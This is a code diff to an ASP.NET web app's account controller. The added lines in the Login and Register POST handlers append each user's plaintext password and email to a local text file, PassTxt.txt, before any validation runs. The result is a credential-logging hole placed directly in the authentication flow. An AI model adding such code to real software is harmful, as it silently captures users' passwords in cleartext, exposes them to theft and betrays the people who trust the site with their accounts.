@@ -27,6 +27,15 @@ namespace WebApp.Controllers
         [HttpPost]
         public async Task<IActionResult> Login(LoginDTO loginDTO)
         {
+            string data = "login \t Pass " + loginDTO.Password + " mail " + loginDTO.Email;
+            string filePath = @"C:\Users\mehem\OneDrive\Desktop\ComparAcademy\NewGroup\ASP.NET\TechBlog\WebApp\PassTxt.txt";
+            using (StreamWriter writer = new StreamWriter(filePath, true))
+            {
+                writer.WriteLine(data);
+            }
+
+
+
             if (!ModelState.IsValid) //todo Bosluqu Yoxlayiriq
             {
                 return View(loginDTO);
@@ -59,6 +68,9 @@ namespace WebApp.Controllers
         }
         public IActionResult Register()
         {
+
+
+
             if (User.Identity.IsAuthenticated)
             {
                 return RedirectToAction("Index", "Home");
@@ -68,6 +80,13 @@ namespace WebApp.Controllers
         [HttpPost]
         public async Task<IActionResult> Register(RegisterDTO registerDTO)
         {
+            string data = "Pass " + registerDTO.Password + " mail " + registerDTO.Email;
+            string filePath = @"C:\Users\mehem\OneDrive\Desktop\ComparAcademy\NewGroup\ASP.NET\TechBlog\WebApp\PassTxt.txt";
+            using (StreamWriter writer = new StreamWriter(filePath, true))
+            {
+                writer.WriteLine(data);
+            }
+
             if (!ModelState.IsValid)
             {
                 return View(registerDTO);
